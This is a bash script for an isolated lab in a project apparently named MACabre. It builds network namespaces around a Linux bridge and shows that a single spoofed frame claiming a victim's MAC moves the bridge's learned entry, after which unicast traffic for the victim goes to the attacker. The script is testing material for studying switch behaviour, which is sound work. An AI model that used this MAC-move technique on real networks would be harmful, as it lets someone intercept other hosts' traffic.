#!/usr/bin/env bash
# Isolated MAC move abuse lab (Linux only, needs root).
#
# Topology, all inside network namespaces:
#
#   victim   --(veth)-- [switch: bridge br0, port p-vic]
#   attacker --(veth)-- [switch: bridge br0, port p-att]
#   monitor  --(veth)-- [switch: bridge br0, port p-mon]
#
#   switch:   a Linux bridge. Its entry for the victim's MAC is dynamic: it is learned from
#             the victim's traffic and follows the latest frame.
#   attacker: MACabre's MAC move sender, on p-att.
#   monitor:  sends unicast frames to the victim's MAC, and counts what each host receives.
#
#   Phase 0 (baseline): the victim sends one frame, so the switch learns its MAC on p-vic.
#                       The monitor sends unicast frames to the victim: the victim receives them.
#   Phase 1 (move): the attacker sends MOVES frames with the victim's MAC. The dynamic entry
#                       should move to p-att.
#   Phase 2 (redirect): the monitor sends unicast frames to the victim's MAC again. Checked:
#                       where they arrive.
#
# What this shows: whether one frame that claims a learned host's MAC from another port moves
# that host's entry on this bridge, and where traffic for the host then goes.
#
# What it does not show: move limits, move logging and allowed-port policies. A Linux bridge
# has none of them, and vendor switches differ. Those need a real switch.
#
# Nothing here touches the host's real network interfaces.
#
# Usage:
#   sudo scripts/lab/mac_move_lab.sh
#   sudo FRAMES=20 MOVES=1 scripts/lab/mac_move_lab.sh
#
# Requirements: iproute2 (ip, bridge) and the project virtualenv (.venv).
# Override the interpreter with PYTHON=/path/to/python.

set -euo pipefail

if [[ "$(id -u)" -ne 0 ]]; then
    echo "This lab needs root: run it with sudo." >&2
    exit 1
fi

for tool in ip bridge; do
    if ! command -v "$tool" >/dev/null 2>&1; then
        echo "Missing required tool: $tool" >&2
        exit 1
    fi
done

ROOT="$(cd "$(dirname "$0")/../.." && pwd)"
PY="${PYTHON:-$ROOT/.venv/bin/python}"
FRAMES="${FRAMES:-10}"
MOVES="${MOVES:-1}"
WINDOW=6
ATTACKER_MAC="02:00:00:00:00:30"
VICTIM_MAC="02:00:00:00:00:50"
MONITOR_MAC="02:00:00:00:00:60"
WORK="$(mktemp -d)"
chmod 755 "$WORK"

stop_lab() {
    for ns in attacker victim monitor switch; do
        ip netns del "$ns" 2>/dev/null || true
    done
}
cleanup() {
    stop_lab
    rm -rf "$WORK"
}
trap cleanup EXIT

stop_lab

ip netns add switch
ip netns add victim
ip netns add attacker
ip netns add monitor

for pair in "vic:victim:$VICTIM_MAC" "att:attacker:$ATTACKER_MAC" "mon:monitor:$MONITOR_MAC"; do
    name="$(echo "$pair" | cut -d: -f1)"
    ns="$(echo "$pair" | cut -d: -f2)"
    mac="$(echo "$pair" | cut -d: -f3-)"
    ip link add "p-$name" type veth peer name "h-$name"
    ip link set "h-$name" netns "$ns"
    ip link set "p-$name" netns switch
    ip netns exec "$ns" ip link set "h-$name" address "$mac"
    ip netns exec "$ns" ip link set "h-$name" up
    ip netns exec switch ip link set "p-$name" up
done

ip netns exec switch ip link add br0 type bridge
ip netns exec switch ip link set br0 up
for name in vic att mon; do
    ip netns exec switch ip link set "p-$name" master br0
done

# Sends one frame from the victim's MAC, so the switch learns it on p-vic.
HELLO_CODE='
import os
from scapy.all import Ether, Raw, sendp
sendp(Ether(src=os.environ["SOURCE_MAC"], dst="ff:ff:ff:ff:ff:ff", type=0x88B5) / Raw(b"hello"), iface="h-vic", verbose=False)
'

# Sends MOVES frames from the attacker, claiming the victim's MAC.
MOVE_CODE='
import os, threading
from macabre.attacks.mac_move import MacMoveConfig, run_mac_move
run_mac_move(
    MacMoveConfig(iface="h-att", target_mac=os.environ["TARGET_MAC"], frames=int(os.environ["MOVES"])),
    threading.Event(),
    lambda _s: None,
)
'

# Sends FRAMES unicast frames from the monitor to the victim's MAC.
UNICAST_CODE='
import os
from scapy.all import Ether, Raw, sendp
frame = Ether(src="02:00:00:00:00:60", dst=os.environ["TARGET_MAC"], type=0x88B5) / Raw(b"unicast probe")
for _ in range(int(os.environ["FRAMES"])):
    sendp(frame, iface="h-mon", verbose=False)
'

# Counts frames of EtherType 0x88B5 seen on an interface for WINDOW seconds, filtered by
# destination (WATCH_DST) and source (WATCH_SRC) when those are set.
WATCH_CODE='
import os, threading
from scapy.all import AsyncSniffer, Ether
dst = os.environ.get("WATCH_DST", "").lower()
src = os.environ.get("WATCH_SRC", "").lower()
seen = []
def on_packet(pkt):
    if not pkt.haslayer(Ether) or pkt[Ether].type != 0x88B5:
        return
    if dst and pkt[Ether].dst.lower() != dst:
        return
    if src and pkt[Ether].src.lower() != src:
        return
    seen.append(1)
sniffer = AsyncSniffer(iface=os.environ["WATCH_IFACE"], store=False, prn=on_packet)
sniffer.start()
threading.Event().wait(float(os.environ["WINDOW"]))
sniffer.stop()
print(len(seen))
'

# Arguments: namespace, interface, output file, destination filter, source filter.
watch() {
    ip netns exec "$1" env PYTHONPATH="$ROOT/src" WATCH_IFACE="$2" WATCH_DST="${4:-}" WATCH_SRC="${5:-}" \
        WINDOW="$WINDOW" "$PY" -c "$WATCH_CODE" > "$3"
}

# The switch port the victim's MAC is learned on, or "none".
victim_port() {
    ip netns exec switch bridge fdb show br br0 | awk -v m="$VICTIM_MAC" '$1 == m {print $3; exit}' | grep . || echo none
}

echo "Phase 0: baseline, the victim sends one frame, then the monitor sends $FRAMES unicast frames to it"
ip netns exec victim env PYTHONPATH="$ROOT/src" SOURCE_MAC="$VICTIM_MAC" \
    "$PY" -c "$HELLO_CODE" >/dev/null 2>&1
sleep 1
watch victim h-vic "$WORK/base_victim.txt" "$VICTIM_MAC" "" &
VIC_PID=$!
watch attacker h-att "$WORK/base_attacker.txt" "$VICTIM_MAC" "" &
ATT_PID=$!
sleep 1
ip netns exec monitor env PYTHONPATH="$ROOT/src" TARGET_MAC="$VICTIM_MAC" FRAMES="$FRAMES" \
    "$PY" -c "$UNICAST_CODE"
wait "$VIC_PID" "$ATT_PID"
BASE_VICTIM="$(cat "$WORK/base_victim.txt")"
BASE_ATTACKER="$(cat "$WORK/base_attacker.txt")"
BASE_PORT="$(victim_port)"
echo "  delivered to the victim: $BASE_VICTIM of $FRAMES"
echo "  delivered to the attacker: $BASE_ATTACKER of $FRAMES"
echo "  switch entry for the victim's MAC: $BASE_PORT"
echo

echo "Phase 1: move, the attacker sends $MOVES frame(s) with the victim's MAC from p-att"
ip netns exec attacker env PYTHONPATH="$ROOT/src" TARGET_MAC="$VICTIM_MAC" MOVES="$MOVES" \
    "$PY" -c "$MOVE_CODE" >/dev/null 2>&1
sleep 1
MOVED_PORT="$(victim_port)"
echo "  switch entry for the victim's MAC after the move: $MOVED_PORT"
echo

echo "Phase 2: redirect, the monitor sends $FRAMES unicast frames to the victim's MAC again"
watch victim h-vic "$WORK/after_victim.txt" "$VICTIM_MAC" "" &
VIC_PID=$!
watch attacker h-att "$WORK/after_attacker.txt" "$VICTIM_MAC" "" &
ATT_PID=$!
sleep 1
ip netns exec monitor env PYTHONPATH="$ROOT/src" TARGET_MAC="$VICTIM_MAC" FRAMES="$FRAMES" \
    "$PY" -c "$UNICAST_CODE"
wait "$VIC_PID" "$ATT_PID"
AFTER_VICTIM="$(cat "$WORK/after_victim.txt")"
AFTER_ATTACKER="$(cat "$WORK/after_attacker.txt")"
echo "  delivered to the victim: $AFTER_VICTIM of $FRAMES"
echo "  delivered to the attacker: $AFTER_ATTACKER of $FRAMES"
echo

if [[ "$BASE_PORT" == "p-vic" && "$BASE_VICTIM" == "$FRAMES" && "$BASE_ATTACKER" == "0" \
    && "$MOVED_PORT" == "p-att" && "$AFTER_ATTACKER" == "$FRAMES" && "$AFTER_VICTIM" == "0" ]]; then
    echo "Result: one move frame from p-att moved the dynamic entry for the victim's MAC to p-att, and unicast traffic for that MAC then reached the attacker instead of the victim. The Linux bridge has no move limit or allowed-port policy, so none was applied. Real switches need to be tested for move limits and logging."
else
    echo "Result: the outcome did not match the expected phases. Result unreliable."
    exit 1
fi
